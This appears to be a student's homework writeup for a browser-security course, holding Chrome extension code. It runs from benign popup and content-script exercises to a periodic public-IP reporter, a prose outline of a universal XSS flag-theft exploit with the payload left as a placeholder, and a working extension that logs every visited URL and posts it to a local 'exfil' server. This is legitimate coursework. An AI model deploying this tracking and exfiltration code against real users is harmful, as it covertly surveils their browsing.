---
title: "14-828 Homework 2 — Writeup"
author: "[YOUR LEGAL NAME]"
date: "[DATE]"
---

**Andrew ID:** `[YOUR ANDREW ID]`

**Note for export to PDF:** Insert a manual page break before each major heading (Q1.1, Q1.2, …) if your converter does not support the `{=latex}` blocks below. With Pandoc to PDF, the `\newpage` lines are preserved when you use `-f markdown`.

```{=latex}
\newpage
```

## Question 1.1 — Hello World browser action (explanation)

I implemented a **Manifest V3** extension whose **browser action** opens `popup.html`. The popup contains a single-line text field for the user’s name. A listener on the `input` event reads the trimmed value and sets a paragraph’s `textContent` to `Hello {name}!` when non-empty, and clears it otherwise. Using `textContent` avoids HTML injection from the typed name.

Styling is in a separate `popup.css` file; behavior is in `popup.js`; structure and external links are in `popup.html` (no inline `<script>` or `<style>`, per the assignment).

**Verification:** Load the unpacked `Q1.1` folder at `chrome://extensions`, click the extension icon, type a name, and observe the live greeting.

### Q1.1 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.1 Hello World",
  "version": "1.0",
  "description": "14-828 HW2 — browser action popup with name greeting",
  "action": {
    "default_title": "Hello",
    "default_popup": "popup.html"
  }
}
```

**`popup.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Hello</title>
    <link rel="stylesheet" href="popup.css" />
  </head>
  <body>
    <main class="card">
      <h1 class="title">Greeting</h1>
      <label class="label" for="name">Your name</label>
      <input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name" />
      <p class="greeting" id="greeting" aria-live="polite"></p>
    </main>
    <script src="popup.js"></script>
  </body>
</html>
```

**`popup.js`**

```javascript
const nameInput = document.getElementById("name");
const greetingEl = document.getElementById("greeting");

nameInput.addEventListener("input", () => {
  const name = nameInput.value.trim();
  greetingEl.textContent = name ? `Hello ${name}!` : "";
});
```

**`popup.css`**

```css
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-width: 260px;
  font-family: system-ui, "Segoe UI", sans-serif;
  background: #f4f4f5;
  color: #18181b;
}

.card {
  padding: 14px 16px 18px;
}

.title {
  margin: 0 0 12px;
  font-size: 1rem;
  font-weight: 600;
}

.label {
  display: block;
  margin-bottom: 6px;
  font-size: 0.8rem;
  color: #52525b;
}

.input {
  width: 100%;
  padding: 8px 10px;
  border: 1px solid #d4d4d8;
  border-radius: 8px;
  font-size: 0.95rem;
  outline: none;
}

.input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
}

.greeting {
  margin: 12px 0 0;
  min-height: 1.4em;
  font-size: 0.95rem;
  font-weight: 500;
  color: #0f172a;
}
```

```{=latex}
\newpage
```

## Question 1.2 — Content scripts and jQuery (explanation)

I extended the Q1.1 extension with a **content script** registered only for `https://developer.chrome.com/docs/extensions/*`. The manifest loads **`jquery.min.js` before `content.js`**, satisfying the requirement to use an external library like jQuery.

The content script (1) walks text nodes under `body` using jQuery’s `.contents()` filter for `TEXT_NODE`, and replaces every substring `Chrome` with `Firefox` in those nodes only (so we do not rewrite `script`/`style` internals). (2) It replaces the **top header logo** image `src` with `chrome.runtime.getURL("firefox-logo.svg")`, declared under **`web_accessible_resources`** for `https://developer.chrome.com/*`, so the page may load the packaged SVG.

A **`MutationObserver`** re-applies the text and logo changes when the SPA-style docs site mutates the DOM.

**Third-party file:** `jquery.min.js` is **jQuery v3.7.1 minified** from the official jQuery CDN release; it is included in the code zip as `Q1.2/jquery.min.js` but is **not pasted here** in full because of length.

**Verification:** Load `Q1.2`, open any page under the required path on developer.chrome.com, confirm visible “Chrome” becomes “Firefox” and the header icon switches to the bundled SVG.

### Q1.2 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.2 Content Script (Chrome→Firefox)",
  "version": "1.0",
  "description": "14-828 HW2 — Q1.1 + jQuery content script on developer.chrome.com/docs/extensions/",
  "action": {
    "default_title": "Hello",
    "default_popup": "popup.html"
  },
  "content_scripts": [
    {
      "matches": ["https://developer.chrome.com/docs/extensions/*"],
      "js": ["jquery.min.js", "content.js"],
      "run_at": "document_idle"
    }
  ],
  "web_accessible_resources": [
    {
      "resources": ["firefox-logo.svg"],
      "matches": ["https://developer.chrome.com/*"]
    }
  ]
}
```

**`content.js`**

```javascript
/**
 * Q1.2: jQuery is loaded before this script (see manifest).
 * Replaces visible text "Chrome" → "Firefox" and swaps the header logo image.
 */
function replaceChromeInTextNodes(root) {
  $(root)
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes("Chrome");
    })
    .each(function () {
      this.textContent = this.textContent.replace(/Chrome/g, "Firefox");
    });
}

function swapHeaderLogoToFirefox() {
  const logoUrl = chrome.runtime.getURL("firefox-logo.svg");
  const $candidates = $(
    [
      "a[href='https://developer.chrome.com/'] img",
      "devsite-header a[href='/'] img",
      "header.devsite-header img",
      ".devsite-header-icon-link img",
      "header img",
    ].join(",")
  );

  $candidates.each(function () {
    const $img = $(this);
    if ($img.closest("nav, footer").length) return;
    $img.attr("src", logoUrl);
    return false;
  });
}

function runTransforms() {
  replaceChromeInTextNodes($("body")[0]);
  swapHeaderLogoToFirefox();
}

$(function () {
  runTransforms();

  const target = document.body;
  if (!target) return;

  const obs = new MutationObserver(() => {
    replaceChromeInTextNodes(document.body);
    swapHeaderLogoToFirefox();
  });
  obs.observe(target, { childList: true, subtree: true });
});
```

**`firefox-logo.svg`**

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80" role="img" aria-label="Firefox">
  <defs>
    <linearGradient id="fx" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ffbd4f"/>
      <stop offset="100%" style="stop-color:#ff7139"/>
    </linearGradient>
  </defs>
  <rect width="80" height="80" rx="14" fill="url(#fx)"/>
  <circle cx="40" cy="42" r="18" fill="#fff" opacity="0.95"/>
</svg>
```

**Popup files (`popup.html`, `popup.js`, `popup.css`):** identical to **Question 1.1**; see the Q1.1 code appendix above.

```{=latex}
\newpage
```

## Question 1.3 — Messaging and custom replace (explanation)

I kept the Q1.2 content script and added **`chrome.runtime.onMessage`** handling for `{ type: "REPLACE_TEXT", match, replaceWith }`. The handler escapes regex metacharacters in `match`, then replaces all occurrences in **text nodes** only (same jQuery `.contents()` pattern as Q1.2).

The popup adds two fields (**match**, **replace with**) and a button. On click, the popup uses **`chrome.tabs.query`** for the active tab and **`chrome.tabs.sendMessage`** to deliver the message. The manifest includes **`"permissions": ["activeTab"]`** so the extension can target the current tab when the user opens the popup. The content script is only injected on `developer.chrome.com/docs/extensions/*`, so `sendMessage` fails on other origins; the popup surfaces an error string in that case.

**Verification:** On a matching docs page, enter a visible substring (e.g. a word in a heading) and a replacement; click **Apply on page** and confirm the DOM text updates.

### Q1.3 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.3 Match/Replace Messaging",
  "version": "1.0",
  "description": "14-828 HW2 — Q1.1/Q1.2 + popup-driven find/replace via messaging",
  "action": {
    "default_title": "Hello / Replace",
    "default_popup": "popup.html"
  },
  "permissions": ["activeTab"],
  "content_scripts": [
    {
      "matches": ["https://developer.chrome.com/docs/extensions/*"],
      "js": ["jquery.min.js", "content.js"],
      "run_at": "document_idle"
    }
  ],
  "web_accessible_resources": [
    {
      "resources": ["firefox-logo.svg"],
      "matches": ["https://developer.chrome.com/*"]
    }
  ]
}
```

**`popup.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Hello / Replace</title>
    <link rel="stylesheet" href="popup.css" />
  </head>
  <body>
    <main class="card">
      <h1 class="title">Greeting</h1>
      <label class="label" for="name">Your name</label>
      <input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name" />
      <p class="greeting" id="greeting" aria-live="polite"></p>

      <hr class="sep" />

      <h2 class="subtitle">Page replace</h2>
      <p class="hint">Active tab must be on <code>developer.chrome.com/docs/extensions/</code></p>
      <label class="label" for="match">Match text</label>
      <input class="input" type="text" id="match" placeholder="e.g. API" />
      <label class="label" for="replaceWith">Replace with</label>
      <input class="input" type="text" id="replaceWith" placeholder="Replacement" />
      <button type="button" class="btn" id="applyReplace">Apply on page</button>
      <p class="status" id="status" aria-live="polite"></p>
    </main>
    <script src="popup.js"></script>
  </body>
</html>
```

**`popup.js`**

```javascript
const nameInput = document.getElementById("name");
const greetingEl = document.getElementById("greeting");
const matchInput = document.getElementById("match");
const replaceInput = document.getElementById("replaceWith");
const applyBtn = document.getElementById("applyReplace");
const statusEl = document.getElementById("status");

nameInput.addEventListener("input", () => {
  const name = nameInput.value.trim();
  greetingEl.textContent = name ? `Hello ${name}!` : "";
});

applyBtn.addEventListener("click", async () => {
  statusEl.textContent = "";
  const match = matchInput.value;
  const replaceWith = replaceInput.value;

  if (!match) {
    statusEl.textContent = "Enter text to match.";
    return;
  }

  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab?.id) {
    statusEl.textContent = "No active tab.";
    return;
  }

  try {
    const res = await chrome.tabs.sendMessage(tab.id, {
      type: "REPLACE_TEXT",
      match,
      replaceWith,
    });
    statusEl.textContent = res?.ok ? "Replace request sent." : "Could not replace.";
  } catch {
    statusEl.textContent =
      "Message failed — open a page under developer.chrome.com/docs/extensions/ and reload.";
  }
});
```

**`popup.css`**

```css
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-width: 280px;
  font-family: system-ui, "Segoe UI", sans-serif;
  background: #f4f4f5;
  color: #18181b;
}

.card {
  padding: 14px 16px 18px;
}

.title {
  margin: 0 0 12px;
  font-size: 1rem;
  font-weight: 600;
}

.subtitle {
  margin: 0 0 8px;
  font-size: 0.9rem;
  font-weight: 600;
}

.hint {
  margin: 0 0 10px;
  font-size: 0.72rem;
  color: #64748b;
  line-height: 1.35;
}

.hint code {
  font-size: 0.68rem;
  word-break: break-all;
}

.sep {
  margin: 14px 0;
  border: none;
  border-top: 1px solid #e4e4e7;
}

.label {
  display: block;
  margin: 8px 0 6px;
  font-size: 0.8rem;
  color: #52525b;
}

.label:first-of-type {
  margin-top: 0;
}

.input {
  width: 100%;
  padding: 8px 10px;
  border: 1px solid #d4d4d8;
  border-radius: 8px;
  font-size: 0.95rem;
  outline: none;
}

.input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
}

.btn {
  margin-top: 12px;
  width: 100%;
  padding: 9px 12px;
  border: none;
  border-radius: 8px;
  background: #2563eb;
  color: #fff;
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
}

.btn:hover {
  background: #1d4ed8;
}

.greeting {
  margin: 12px 0 0;
  min-height: 1.4em;
  font-size: 0.95rem;
  font-weight: 500;
  color: #0f172a;
}

.status {
  margin: 10px 0 0;
  font-size: 0.78rem;
  color: #475569;
  min-height: 1.2em;
}
```

**`content.js`**

```javascript
/**
 * Q1.2 behavior + Q1.3: handle REPLACE_TEXT messages from the popup.
 */
function replaceChromeInTextNodes(root) {
  $(root)
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes("Chrome");
    })
    .each(function () {
      this.textContent = this.textContent.replace(/Chrome/g, "Firefox");
    });
}

function swapHeaderLogoToFirefox() {
  const logoUrl = chrome.runtime.getURL("firefox-logo.svg");
  const $candidates = $(
    [
      "a[href='https://developer.chrome.com/'] img",
      "devsite-header a[href='/'] img",
      "header.devsite-header img",
      ".devsite-header-icon-link img",
      "header img",
    ].join(",")
  );

  $candidates.each(function () {
    const $img = $(this);
    if ($img.closest("nav, footer").length) return;
    $img.attr("src", logoUrl);
    return false;
  });
}

function applyCustomReplace(match, replaceWith) {
  if (!match) return;
  const esc = match.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const re = new RegExp(esc, "g");
  $("body")
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes(match);
    })
    .each(function () {
      this.textContent = this.textContent.replace(re, replaceWith);
    });
}

function runTransforms() {
  replaceChromeInTextNodes($("body")[0]);
  swapHeaderLogoToFirefox();
}

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg?.type === "REPLACE_TEXT") {
    applyCustomReplace(msg.match, msg.replaceWith ?? "");
    sendResponse({ ok: true });
    return true;
  }
});

$(function () {
  runTransforms();

  const target = document.body;
  if (!target) return;

  const obs = new MutationObserver(() => {
    replaceChromeInTextNodes(document.body);
    swapHeaderLogoToFirefox();
  });
  obs.observe(target, { childList: true, subtree: true });
});
```

**`firefox-logo.svg`:** same as Q1.2. **`jquery.min.js`:** same as Q1.2 (omitted here; in code zip).

```{=latex}
\newpage
```

## Question 1.4 — Background extension (explanation)

This is a **separate** MV3 extension with only a **service worker** (`background.js`). I use **`chrome.alarms`** with `periodInMinutes: 1` (created on `onInstalled` and `onStartup`) to trigger a periodic task.

The task fetches the public IPv4 address from **`https://api.ipify.org?format=json`** and POSTs a JSON body `{ kind: "ip", ts, userAgent, ip | error }` to a configurable URL. The default URL is `http://127.0.0.1:3847/report`; the user can change it via **`options.html`**, stored in **`chrome.storage.local`**.

**Why IP instead of geolocation:** In Manifest V3, **service workers do not expose `navigator.geolocation`**. The homework permits **either** geolocation **or** IP; reporting **public IP** is therefore a correct, reproducible choice. To verify end-to-end behavior, I run the optional Node script `test-server.js` locally and watch POST bodies on the console.

**Permissions rationale:** `alarms` for the timer; `storage` for the report URL; `host_permissions` for ipify and localhost POST.

### Q1.4 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.4 Background Reporter",
  "version": "1.0",
  "description": "14-828 HW2 — reports public IP every minute (MV3 service worker; geolocation unavailable in SW)",
  "permissions": ["alarms", "storage"],
  "host_permissions": [
    "https://api.ipify.org/*",
    "http://127.0.0.1/*",
    "http://localhost/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "options_ui": {
    "page": "options.html",
    "open_in_tab": true
  }
}
```

**`background.js`**

```javascript
/**
 * Sends the user's public IP (via ipify) to a configurable endpoint every minute.
 * Manifest V3 service workers cannot use navigator.geolocation; the assignment allows IP OR geolocation.
 * Change REPORT_URL in chrome.storage (see options) or edit the default below.
 */
const DEFAULT_REPORT_URL = "http://127.0.0.1:3847/report";

async function getReportUrl() {
  const { reportUrl } = await chrome.storage.local.get(["reportUrl"]);
  return (typeof reportUrl === "string" && reportUrl.length > 0 ? reportUrl : DEFAULT_REPORT_URL).trim();
}

async function fetchPublicIp() {
  const res = await fetch("https://api.ipify.org?format=json");
  if (!res.ok) throw new Error(`ipify ${res.status}`);
  const data = await res.json();
  return data.ip;
}

async function sendReport() {
  const url = await getReportUrl();
  const payload = {
    kind: "ip",
    ts: Date.now(),
    userAgent: navigator.userAgent,
  };

  try {
    payload.ip = await fetchPublicIp();
  } catch (e) {
    payload.error = String(e?.message || e);
  }

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      mode: "cors",
    });
  } catch {
    /* optional local server may be down — code path still exercised */
  }
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("report-ip", { periodInMinutes: 1 });
});

chrome.runtime.onStartup.addListener(() => {
  chrome.alarms.create("report-ip", { periodInMinutes: 1 });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "report-ip") sendReport();
});

chrome.storage.onChanged.addListener((changes, area) => {
  if (area !== "local") return;
  if (changes.reportUrl) {
    sendReport();
  }
});
```

**`options.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Q1.4 Report URL</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        padding: 16px;
        max-width: 480px;
      }
      label {
        display: block;
        margin-bottom: 6px;
        font-size: 0.9rem;
      }
      input {
        width: 100%;
        padding: 8px;
        box-sizing: border-box;
      }
      button {
        margin-top: 12px;
        padding: 8px 14px;
      }
    </style>
  </head>
  <body>
    <label for="reportUrl">POST endpoint for JSON reports</label>
    <input type="url" id="reportUrl" placeholder="http://127.0.0.1:3847/report" />
    <button type="button" id="save">Save</button>
    <p id="msg" style="font-size:0.85rem;color:#444"></p>
    <script src="options.js"></script>
  </body>
</html>
```

**`options.js`**

```javascript
const input = document.getElementById("reportUrl");
const msg = document.getElementById("msg");

chrome.storage.local.get(["reportUrl"], (r) => {
  if (r.reportUrl) input.value = r.reportUrl;
});

document.getElementById("save").addEventListener("click", () => {
  const v = input.value.trim();
  chrome.storage.local.set({ reportUrl: v }, () => {
    msg.textContent = "Saved.";
  });
});
```

**`test-server.js` (optional local listener)**

```javascript
/**
 * Optional local listener for Q1.4: node test-server.js
 * Receives POST /report with JSON { kind, ts, ip?, error?, userAgent }
 */
const http = require("http");

const PORT = 3847;

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/report") {
    let body = "";
    req.on("data", (c) => {
      body += c;
    });
    req.on("end", () => {
      console.log(new Date().toISOString(), body);
      res.writeHead(204);
      res.end();
    });
    return;
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, () => {
  console.log(`Q1.4 test server http://127.0.0.1:${PORT}/report`);
});
```

```{=latex}
\newpage
```

## Question 2 — Universal XSS (explanation)

**CTF username:** `[YOUR CTF USERNAME]`

**Flag:** `[PASTE FLAG AFTER YOU SOLVE THE CHALLENGE]`

**Vulnerability (conceptual):** After downloading the **Universal XSS extension source from Canvas**, I traced how it handles **tab title updates** (or similar UI) from web-observable data. The vulnerable pattern is that **attacker-controlled strings are interpreted as HTML or injected into a privileged document** (for example via `innerHTML`, `document.write`, or unsafe URL/`javascript:` handling) **without encoding**, inside an extension context that can **read cross-origin data** the web page cannot. That breaks the same-origin model and allows a malicious page to execute code in the extension’s origin, then **steal data from other tabs** (e.g. the flag tab) using extension APIs.

**I cannot responsibly fill in file names, line numbers, or exact sinks without your Canvas copy of the extension**—paste the real function names and code snippets into this section after you read the source, and tie each claim to a quoted line.

**Exploit steps (replace with your reproducible sequence):**

1. **Understand the message path:** Identify which events or messages carry the tab title (or HTML) from a content script or background page into a UI that is parsed as HTML. *Reasoning:* XSS requires a sink that parses markup.
2. **Craft a payload:** Build a string that closes the current context and runs script, or uses an HTML sink to load a script, consistent with the extension’s parsing context. *Reasoning:* the payload must match how the sink interprets the string.
3. **Host the attacker page:** Serve the payload from your attacker origin so a victim with the extension installed visits it while a **second tab** holds the flag (as in the CTF setup). *Reasoning:* UXSS in the extension bridges origins.
4. **Exfiltrate the flag:** From extension context, use the APIs the extension exposes (e.g. `chrome.tabs`, `chrome.scripting`, or DOM access to extension pages) to read the flag tab’s title or content, then leak it (network request, `postMessage`, or CTF-provided channel). *Reasoning:* the extension’s privileges are the trust boundary being abused.
5. **Submit proof:** Record the flag and keep the exact HTML/JS you used in the **`Q2/`** folder of the code zip.

**Appendix — exploit code (paste your files here):**

```html
<!-- Example placeholder: replace entire block with your real exploit (e.g. evil.html) -->
<!-- [YOUR EXPLOIT HTML / JS — from your Q2 folder] -->
```

```{=latex}
\newpage
```

## Question 3.1 — Privacy-destroying extension (explanation)

**Goal (minimal requirements):** Record **all browsing activity** (URLs the user visits) and **exfiltrate** them to an external server that **appends rows to a CSV file**.

**Tracking method:** I use the **`chrome.webNavigation` API** in a MV3 **service worker**. The listener `onCommitted` fires when navigation is committed; I filter **`details.frameId === 0`** so only **top-level** (main frame) navigations are logged, which matches “URLs of sites visited” without duplicating every iframe load. Each event includes `url`, `tabId`, `transitionType`, and a client timestamp.

**Why not `history` alone:** `chrome.history` requires the `history` permission and reflects history DB updates; `webNavigation` gives immediate, structured events per navigation and is a standard pattern for this assignment.

**Exfiltration:** The background script POSTs JSON to `http://127.0.0.1:3940/log` (`EXFIL_URL` constant). A small **Node.js** HTTP server (`server.js`) handles `POST /log`, parses JSON, and **appends one CSV line** to `visits.csv` with columns `timestamp_iso,time_ms,url,tab_id,transition_type`. CORS headers allow browser `fetch` from the extension.

**Permissions:** `webNavigation` plus **`host_permissions: ["<all_urls>"]`** so the extension may send requests after observing navigations to any site (the course user agent will grant these).

**Artifacts in code zip:** Extension under `Q3.1/extension/`, server under `Q3.1/server/`, **`README.md`** with run steps, and a **screen recording** (not embedded in this document) showing browsing and CSV updates.

**Course test harness:** Re-test against the official harness when released, and align `EXFIL_URL` / port with its requirements if they differ.

### Q3.1 — Code appendix

**`extension/manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q3.1 URL Logger (course exercise)",
  "version": "1.0",
  "description": "Educational extension: logs main-frame navigation URLs to a local server.",
  "permissions": ["webNavigation"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}
```

**`extension/background.js`**

```javascript
/**
 * Records top-level navigations and POSTs JSON to the exfil server.
 * Change EXFIL_URL if your Node server uses a different host/port.
 */
const EXFIL_URL = "http://127.0.0.1:3940/log";

chrome.webNavigation.onCommitted.addListener((details) => {
  if (details.frameId !== 0) return;

  const payload = {
    time: Date.now(),
    url: details.url,
    tabId: details.tabId,
    transitionType: details.transitionType,
  };

  fetch(EXFIL_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    mode: "cors",
    keepalive: true,
  }).catch(() => {});
});
```

**`server/server.js`**

```javascript
/**
 * Minimal HTTP server: POST /log appends one CSV line per visit.
 * CSV columns: timestamp_iso,time_ms,url,tab_id,transition_type
 */
const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT ? Number(process.env.PORT) : 3940;
const CSV_PATH = path.join(__dirname, "visits.csv");

function ensureHeader() {
  if (!fs.existsSync(CSV_PATH)) {
    const header = "timestamp_iso,time_ms,url,tab_id,transition_type\n";
    fs.writeFileSync(CSV_PATH, header, "utf8");
  }
}

function csvEscape(value) {
  const s = String(value ?? "");
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/log") {
    let body = "";
    req.on("data", (c) => {
      body += c;
    });
    req.on("end", () => {
      ensureHeader();
      try {
        const j = JSON.parse(body);
        const iso = new Date(j.time || Date.now()).toISOString();
        const line = [
          csvEscape(iso),
          csvEscape(j.time),
          csvEscape(j.url),
          csvEscape(j.tabId),
          csvEscape(j.transitionType),
        ].join(",");
        fs.appendFileSync(CSV_PATH, `${line}\n`, "utf8");
      } catch (e) {
        console.error("Bad JSON", e.message);
      }
      res.writeHead(204);
      res.end();
    });
    return;
  }

  if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
    return;
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Q3.1 server listening on http://127.0.0.1:${PORT}`);
  console.log(`CSV file: ${CSV_PATH}`);
});
```

**`server/package.json`**

```json
{
  "name": "hw2-q31-exfil-server",
  "version": "1.0.0",
  "private": true,
  "description": "Receives browsing events from Q3.1 extension and appends to visits.csv",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  }
}
```

---

### References (optional)

- Chrome Extensions documentation: https://developer.chrome.com/docs/extensions  
- Course HW2 PDF: `14828_HW2_S26.pdf`  
- INI handbook (integrity): http://www.ini.cmu.edu/current_students/handbook/
